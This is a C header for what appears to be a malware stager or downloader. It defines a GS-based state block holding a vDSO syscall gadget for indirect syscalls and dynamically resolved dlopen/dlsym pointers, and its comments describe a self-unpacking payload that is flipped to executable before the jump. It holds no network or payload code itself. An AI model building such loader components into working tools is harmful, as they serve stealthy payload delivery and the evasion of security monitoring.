#ifndef STAGER_STATE_H
#define STAGER_STATE_H

/*
 * Runtime state for the freestanding stager.
 *
 * The stager image is mapped RX (W^X): the self-unpacker maps the payload
 * read/write, then flips it to read/execute before jumping. Because the image
 * cannot be written once it is running, mutable globals cannot live in .data.
 *
 * Instead, downloader_main() calls stager_state_init() once, before any
 * syscall. That mmaps a dedicated read/write page for the single mutable
 * state block and installs its address as the GS base. get_stager_state()
 * reads the self pointer at %gs:0, so any compiler can address the block
 * without reserving a general-purpose register (clang has no -ffixed-r15).
 */

typedef void *(*dlopen_fn)(const char *, int);
typedef void *(*dlsym_fn)(void *, const char *);
typedef int (*dlclose_fn)(void *);

struct stager_state {
  struct stager_state *self; /* %gs:0 points back here (see get_stager_state) */
  void *syscall_gadget;      /* resolved vDSO `syscall; ret` gadget */
  long dl_ready;             /* 1 = dl* cache not yet resolved */
  dlopen_fn dlopen_;
  dlsym_fn dlsym_;
  dlclose_fn dlclose_;
};

/* Sentinel value for syscall_gadget before init_indirect_syscalls(). */
#define _SYSCALL_GADGET_UNRESOLVED ((void *)1)

/* Read the state block installed as the GS base by stager_state_init().
 * %gs:0 is the block's self pointer, so no general-purpose register is
 * reserved and every translation unit gets the same stable address. */
static inline struct stager_state *get_stager_state(void) {
  struct stager_state *st;
  __asm__ __volatile__("movq %%gs:0, %0" : "=r"(st));
  return st;
}

/* mmap a dedicated RW state page, initialise it, and install it as the GS
 * base. Must be called once at the top of downloader_main, before any
 * syscall. */
void stager_state_init(void);

#endif /* STAGER_STATE_H */
